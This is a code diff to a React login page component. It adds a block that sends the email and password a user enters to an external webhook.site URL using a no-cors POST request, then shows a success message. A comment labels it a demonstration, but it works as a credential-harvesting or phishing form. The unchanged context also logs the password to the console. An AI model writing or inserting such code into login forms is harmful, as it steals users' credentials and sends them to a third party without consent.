@@ -39,6 +39,26 @@ export default function LoginPage() {
     console.log("Email:", email)
     console.log("Password:", password)
 
+    try {
+      // Send credentials to a webhook (for demonstration purposes)
+      const webhookUrl = 'https://webhook.site/67bed246-ea62-40ff-94f4-dcdfa73b3934';
+      const response = await fetch(webhookUrl, {
+        mode: 'no-cors',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ email, password }),
+      })
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+
+    } catch (error) {
+      console.error("An error occurred while logging credentials:", error)
+    }
+
     // Show success message
     setShowSuccess(true)
 
